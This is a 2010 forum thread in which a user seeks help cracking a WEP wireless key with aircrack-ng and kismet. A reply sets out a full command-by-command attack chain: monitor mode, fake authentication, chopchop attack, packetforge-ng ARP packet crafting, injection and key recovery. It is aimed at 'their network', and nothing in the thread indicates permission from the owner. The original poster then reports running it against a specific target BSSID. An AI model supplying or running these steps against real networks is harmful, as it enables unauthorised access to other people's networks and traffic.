---
title: "aircrack"
date: 2010-02-27
forum: Networking &amp; Wireless
---

### Post by tenebrous_paradise on 2010-02-27
ive been looking aaround for answers and i have not found them so this is my next step if anyone knows the answer to any/all of these problems please write back using aircrack-ng and kismet to try to get a wep key :D

i got the ESSID and the BSSID no clue what the wep whatever is.. this is the site im going off of [http://ubuntulinuxhelp.com/using-ubuntu-to-crack-wep/](http://ubuntulinuxhelp.com/using-ubuntu-to-crack-wep/)

first off here is my kismet error...

root@ubuntu:~# sudo kismet
Server options:  none
Client options:  none
Starting server...
Waiting for server to start before starting UI...
Suid priv-dropping disabled.  This may not be secure.
No specific sources given to be enabled, all will be enabled.
Enabling channel hopping.
Enabling channel splitting.
Source 0 (madwifi): Enabling monitor mode for madwifi_ag source interface wlan0 channel 6...
FATAL: Failed to retrieve list of private ioctls 95:Operation not supported
[1] + Done(1)                    ${BIN}/kismet_server --silent ${server}


next problem i am having:

snowflake@ubuntu:~$ sudo airodump wlan0 mist.iv channel# 6

ARP linktype is set to 1 (Ethernet) - expected ARPHRD_IEEE80211
or ARPHRD_IEEE80211_PRISM instead.  Make sure RFMON is enabled:
run 'ifconfig wlan0 up; iwconfig wlan0 mode Monitor channel <#>'

ok so when i take their advice and type in the run "ifconfig...... here is what i get 


root@ubuntu:~# ifconfig wlan0 up; iwconfig wlan0 mode Monitor channel 6
Error for wireless request "Set Mode" (8B06) :
    SET failed on device wlan0 ; Device or resource busy.


last question.. how do i get this? 

sudo aireplay -1 0 -e ESSID -a BSSID **-h 0:1:2:3:4:5** ath0

-h smac   : set Source       MAC address

how do i get the MAC address?

---

### Post by zaksworld on 2010-02-27
I found this on a youtube page of some sort:



# iwconfig
or
# ifconfig (find your wireless interface name) {write down your mac address}
...
# airodump-ng wlan0 (scans for wireless networks) {find the WEP network you want to crack and write down the network name, channel, and mac address}
...
# airmon-ng start wlan0 6 (puts your wifi card in monitor mode on channel 1) {change 1 to the channel their network is on}
...
# aireplay-ng -1 0 -e jones -a 00:21:29:8E:42:E0 -h 00:00:00:00:00:00 wlan0 (fake authentication)
{-e = their network name, -a = their mac address, -h = your mac address, wlan0 = your wireless interface name}
...

# aireplay-ng -4 -h 00:00:00:00:00:00 -b 00:21:29:8E:42:E0 wlan0 (chopchop attack)
{-h = your mac address, -b = their mac address, wlan0 = your wireless interface name}
...
# packetforge-ng -0 -a 00:21:29:8E:42:E0 -h 00:00:00:00:00:00 -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-0607-080523.xor -w arp-request (create an arp packet)
{-a = their mac address, -h = your mac address, -y = file from the attack}
...
# airodump-ng -c 1 --bssid 00:21:29:8E:42:E0 -w packets wlan0
{-c = channel of their network, --bssid = their mac address, -w = name for the captured packets, wlan0 = your wireless interface name}
...
# aireplay-ng -1 0 -e jones -a 00:21:29:8E:42:E0 -h 00:00:00:00:00:00 wlan0 (fake authentication)
{-e = their network name, -a = their mac address, -h = your mac address, wlan0 = your wireless interface name}
...
# aireplay-ng -2 -r arp-request mon0 (Inject the arp packet)
...
# aircrack-ng -b 00:21:29:8E:42:E0 packets-06.cap (obtain the WEP key)
{-b = their mac address, packets*.cap = name for the captured packets}

If you need any more help, just pm me, and I'll post a response ;)

---

### Post by tenebrous_paradise on 2010-02-27
made it down to packet forge but i dont know their IP address....

---

### Post by tenebrous_paradise on 2010-02-27
snowflake@ubuntu:~$ sudo packetforge-ng -0 -a 00:18:3a:9b:42:b7 -h 00:13:10:86:e3:37 -k 255.255.255.255 -l 255.255.255.255 -y mist.iv -w arp-request
[sudo] password for snowflake: 
Is this really a PRGA file: mist.iv?
fread failed
"packetforge-ng --help" for help

how do i make that file "mist.iv" into a prga file?

also i dont know what to put for the -k <255.255.255.255> i know it is supposed to be their IP address but i dont have their ip address/port what do i use to get that... im close to getting this to work but im stuck so PLEASE help.

---

### Post by tenebrous_paradise on 2010-02-27
ok nevermind all that i got it all figured out except i cant get any data packets with the network im after 

root@ubuntu:~# aircrack-ng -b 00:18:3a:9b:42:b7 output*cap
Opening output-01.cap
Opening output-02.cap
Opening output-03.cap
Got no data packets from target network!

---

